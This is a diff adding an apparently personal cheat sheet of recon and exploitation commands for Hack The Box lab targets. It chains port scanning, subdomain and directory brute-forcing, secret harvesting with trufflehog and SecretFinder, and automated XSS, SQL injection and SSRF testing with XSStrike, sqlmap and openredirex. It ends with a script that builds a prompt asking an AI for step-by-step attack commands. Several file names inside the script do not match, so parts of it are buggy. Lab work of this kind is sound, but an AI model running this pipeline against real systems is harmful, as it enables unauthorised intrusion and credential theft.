@@ -1,0 +1,82 @@
+ _____                                     _   _             
+|  ___|                                   | | (_)            
+| |__ _ __  _   _ _ __ ___   ___ _ __ __ _| |_ _  ___  _ __  
+|  __| '_ \| | | | '_ ` _ \ / _ \ '__/ _` | __| |/ _ \| '_ \ 
+| |__| | | | |_| | | | | | |  __/ | | (_| | |_| | (_) | | | |
+\____/_| |_|\__,_|_| |_| |_|\___|_|  \__,_|\__|_|\___/|_| |_|
+                                                             
+                                                             
+
+PRIMARY ENUMERATION COMMAND (FIND ALL OPEN PORTS, WEB AVAILABLE PORTS, WEB AVAILABLE PORTS, DIRECTORIES FOR ALL WEB PORTS, JS ENDPOINTS, AND JSON ENDPOINTS, AND PORT INFORMATION)
+$h='C:\Windows\System32\drivers\etc\hosts';$n="10.129.19.203`tcurrentbox.htb";$c=Get-Content $h;if($c -match 'currentbox\.htb'){$c=$c -replace '.*currentbox\.htb.*',$n}else{$c+="`r`n$n"};Set-Content -Path $h -Value $c
+
+TARGET="currentbox.htb" ; \
+rustscan -a $TARGET -r 1-65535 -- -sV | tee technologies.txt | grep "/tcp" | grep "open" | awk -v TARGET=$TARGET '{split($1,a,"/"); if (a[1] ~ /^[0-9]+$/) print TARGET ":" a[1]}' > port_targets.txt ; \
+~/go/bin/httpx -l port_targets.txt > all_web_targets.txt ; \
+cp all_web_targets.txt clean_web_targets.txt ; \
+while read -r target; do domain=$(echo "$target" | awk -F[/:] '{print $3}'); [[ $domain =~ [a-zA-Z] ]] && subfinder -d $domain >> web_subdomains.txt; done < all_web_targets.txt ; \
+gau $TARGET >> all_web_targets.txt ; \
+katana -list all_web_targets.txt -js-crawl -silent | sort -u >> all_web_targets.txt ; \
+grep -i '\.js$' all_web_targets.txt > js_web_targets.txt && grep -i '\.json$' all_web_targets.txt > json_web_targets.txt ; \
+dirsearch -l clean_web_targets.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects -o web_directories.txt --format=simple ; \
+~/go/bin/httpx -l clean_web_targets.txt -tech-detect >> technologies.txt ; \
+cat clean_web_targets.txt | parallel -j10 'echo "[*] Testing {}" >&2; wafw00f {} 2>/dev/null | grep -q "No WAF detected" && echo {}' > nowaf_web_targets.txt ; \
+cat all_web_targets.txt | parallel -j10 'status=$(curl -o /dev/null -s -w "%{http_code}" -k -L {}); if [ "$status" = "403" ]; then echo {}; fi' > 403_web_targets.txt ; \
+mkdir -p ~/bugbounty/reports ; \
+cat 403_web_targets.txt | xargs -P10 -I{} bash -c 'PYTHONWARNINGS="ignore" dirsearch -u "{}" -e php,html,js,json,txt,log,zip,conf,sql -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --threads 30 --timeout 10 --retries 2 --follow-redirects --full-url --output ~/bugbounty/reports/$(echo "{}" | sed "s|https\?://||;s|/|_|g").txt' ; \
+cat technologies.txt | sed 's/\x1b\[[0-9;]*m//g' | grep '\[403' | awk '{print $1}' > 403_web_targets.txt ; \
+paramspider -l clean_web_targets.txt && cat results/*.txt > param_urls_temp.txt && sort -u param_urls_temp.txt -o param_urls.txt && rm -rf results param_urls_temp.txt && python3 /home/c/tools/SecretFinder/SecretFinder.py -i all_web_targets.txt -o possible_secrets_secretfinder.html ; \
+trufflehog filesystem ./ --json > possible_secrets_trufflehog.json ; \
+cat param_urls.txt | gf xss > xss_candidates.txt && cat param_urls.txt | gf sqli > sqli_candidates.txt ; \
+cat param_urls.txt | gf ssrf > ssrf_candidates.txt ; \
+(mkdir -p js_tmp && cd js_tmp && xargs -n 1 -P 10 curl -sO < ../js_web_targets.txt && retire --path .) 2>&1 | tee retire_js_results.txt && rm -rf js_tmp ; \
+cat all_web_targets.txt port_targets.txt > combined_targets.txt ; \
+sort -u all_web_targets.txt -o all_web_targets.txt && sort -u web_directories.txt -o web_directories.txt && sort -u 403_web_targets.txt -o 403_web_targets.txt && rm -rf reports ; \
+find . -maxdepth 1 -type f -empty -delete
+
+Start-Process notepad.exe "C:\Windows\System32\drivers\etc\hosts" -Verb RunAs
+
+ _____           _       _ _        _   _             
+|  ___|         | |     (_) |      | | (_)            
+| |____  ___ __ | | ___  _| |_ __ _| |_ _  ___  _ __  
+|  __\ \/ / '_ \| |/ _ \| | __/ _` | __| |/ _ \| '_ \ 
+| |___>  <| |_) | | (_) | | || (_| | |_| | (_) | | | |
+\____/_/\_\ .__/|_|\___/|_|\__\__,_|\__|_|\___/|_| |_|
+          | |                                         
+          |_|                                         
+
+EXPLOIT XXS, SQLI, AND SSRF
+while read url; do python3 /home/c/tools/XSStrike/xsstrike.py -u "$url"; done < xss_candidates.txt
+sqlmap -m sqli_candidates.txt --batch
+cat ssrf_candidates.txt | openredirex -p openredirex/payloads.txt -k "FUZZ" -c 50
+
+POSSIBLE SCANS WITH NUCLEI
+nuclei -list combined_targets.txt -o nuclei_scan.txt
+
+USEFUL DIRECTORY BRUTEFORCING COMMANDS / COMMANDS TO DIRECTORY BRUTEFORCE ALL FOUND SUBDOMAINS
+dirsearch -u http://artificial.htb/dashboard -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects
+
+dirsearch -l all_web_targets.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects
+
+dirsearch -l all_web_targets.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -e php,js,jpg,png,html,json,txt -t 50 --follow-redirects
+
+AI ASSISTANCE PROMPT GENERATOR
+{ 
+  echo 'For my authorised penetration test, list the most interesting findings below and what to look into also guide me step by step on exactly what commands to run to test and what to look out for and explain in maximum detail why im running these commands. Also at the end list the specific what you think are important subdomains I should dirsearch to find endpoints to test (include what endpoints you'll think i'll likely find and why if there are clues).'
+  [ -f clean_web_targets.txt ] && echo -e '\n\n## All Clean Web Subdomains\n' && cat clean_subdomains.txt
+  [ -f technologies.txt ] && echo -e '\n\n## Technologies\n' && cat technologies.txt
+  [ -f all_web_targets.txt ] && echo -e '\n\n## All Web Endpoints\n' && cat all_subdomains.txt
+  [ -f param_urls.txt ] && echo -e '\n\n## All Web Parameters\n' && cat param_urls.txt
+  echo -e '\n\n## Detected Possible Secrets\n'
+  [ -f possible_secrets_secretfinder.html ] && cat possible_secrets_secretfinder.html
+  [ -f possible_secrets_trufflehog.json ] && cat possible_secrets_trufflehog.json
+  [ -f xss_candidates.txt ] && echo -e '\n\n## XSS Candidates\n' && cat xss_candidates.txt
+  [ -f sqli_candidates.txt ] && echo -e '\n\n## SQLi Candidates\n' && cat sqli_candidates.txt
+  [ -f ssrf_candidates.txt ] && echo -e '\n\n## SSRF Candidates\n' && cat ssrf_candidates.txt
+  [ -f nuclei_scan.txt ] && echo -e '\n\n## Nuclei Results\n' && cat nuclei_scan.txt
+  [ -f nowaf_web_targets.txt ] && echo -e '\n\n## No WAF Web Subdomains\n' && cat nowaf_subdomains.txt
+  [ -f 403_web_targets.txt ] && echo -e '\n\n## 403 Web Subdomains\n' && cat 403_subdomains.txt
+  [ -f param_urls.txt ] && echo -e '\n\n## Parameter Web URLs\n' && cat param_urls.txt
+  [ -f retire_js_results.txt ] && echo -e '\n\n## Web Retire JS Results\n' && cat retire_js_results.txt
+403_subdomains.txt
+} > prompt.txt; explorer.exe .
